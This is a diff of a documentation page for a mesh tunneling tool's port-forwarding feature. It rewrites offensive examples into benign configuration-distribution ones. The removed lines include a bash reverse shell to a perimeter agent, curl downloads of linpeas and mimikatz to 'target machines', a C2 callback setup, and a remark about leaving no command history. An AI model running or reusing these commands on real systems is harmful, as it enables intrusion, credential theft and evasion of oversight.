@@ -12,11 +12,11 @@ sidebar_position: 7
 Expose local services through your mesh network. Run a web server on your machine and make it accessible from any agent in the mesh - even when you're many network hops away.
 
 ```bash
-# From a target machine deep in the network:
-curl http://nearest-agent:8080/tools/linpeas.sh -o /tmp/lp.sh
+# From a remote office site:
+curl http://nearest-agent:8080/configs/setup.sh -o /tmp/setup.sh
 ```
 
-This downloads from your local web server, tunneled through the mesh.
+This downloads from your central server, tunneled through the mesh.
 
 ## How It Works
 
@@ -48,7 +48,7 @@ flowchart RL
 | **Use case** | Access remote resources | Expose local services |
 | **Who initiates** | Your local application | Remote application |
 | **Configuration** | `socks5` + `exit` sections | `forward` section |
-| **Example** | Browse internal network via proxy | Serve tools to field agents |
+| **Example** | Browse internal network via proxy | Serve configuration files to remote agents |
 
 ## Configuration
 
@@ -58,71 +58,69 @@ Port forwarding uses **routing keys** to match listeners with endpoints:
 # On YOUR machine (where the service runs) - the "endpoint"
 forward:
   endpoints:
-    - key: "my-tools"           # Routing key (advertised to mesh)
+    - key: "my-files"            # Routing key (advertised to mesh)
       target: "localhost:80"     # Your local service
 
 # On REMOTE agents (where clients connect) - the "listeners"
 forward:
   listeners:
-    - key: "my-tools"           # Must match endpoint key
-      address: ":8080"          # Port remote clients use
-      max_connections: 100      # Optional limit
+    - key: "my-files"            # Must match endpoint key
+      address: ":8080"           # Port remote clients use
+      max_connections: 100       # Optional limit
 ```
 
 See [Configuration - Forward](/configuration/forward) for full reference.
 
 ## Common Scenarios
 
-### Tool Distribution
+### Configuration Distribution
 
-Serve payloads, scripts, and executables to target machines throughout the network:
+Serve configuration files, scripts, and updates to remote sites:
 
 ```yaml
-# Operator machine
+# Central server
 forward:
   endpoints:
-    - key: "op-tools"
+    - key: "config-server"
       target: "localhost:8000"
 ```
 
 ```bash
 # Start a simple HTTP server
-python3 -m http.server 8000 --directory ./tools
+python3 -m http.server 8000 --directory ./configs
 ```
 
 ```yaml
-# All field agents
+# Remote site agents
 forward:
   listeners:
-    - key: "op-tools"
+    - key: "config-server"
       address: "127.0.0.1:8080"
 ```
 
-From any target machine: `curl http://field-agent:8080/mimikatz.exe -o mimi.exe`
+From any remote site: `curl http://local-agent:8080/site-config.yaml -o config.yaml`
 
-### C2 Callback Reception
+### Internal Service Access
 
-Receive reverse shells or C2 callbacks through the mesh:
+Make internal services accessible from remote sites:
 
 ```yaml
-# Operator machine
+# Headquarters (where the service runs)
 forward:
   endpoints:
-    - key: "callback-443"
-      target: "localhost:4444"
+    - key: "internal-api"
+      target: "localhost:3000"
 ```
 
 ```yaml
-# Perimeter agent (exposed to target network)
+# Branch office agents
 forward:
   listeners:
-    - key: "callback-443"
-      address: "0.0.0.0:443"
+    - key: "internal-api"
+      address: "127.0.0.1:3000"
 ```
 
-From target: `bash -i >& /dev/tcp/perimeter-agent/443 0>&1`
-
-The callback traverses the mesh to your local netcat listener.
+Applications at branch offices can access the internal API at `localhost:3000`.
 
 ### Multiple Services
 
@@ -131,11 +129,11 @@ Expose several services through different routing keys:
 ```yaml
 forward:
   endpoints:
-    - key: "http-tools"
+    - key: "http-docs"
       target: "localhost:80"
-    - key: "smb-share"
+    - key: "file-share"
       target: "localhost:445"
-    - key: "ssh-jump"
+    - key: "ssh-access"
       target: "localhost:22"
 ```
 
@@ -147,7 +145,7 @@ forward:
 
 - **Connection Limits**: Set `max_connections` on listeners to prevent resource exhaustion.
 
-- **Configuration Only**: No CLI commands exist for port forwarding - all setup is via config files, leaving no command history.
+- **Configuration Based**: Port forwarding is configured via config files for consistent deployment.
 
 ## Monitoring
 
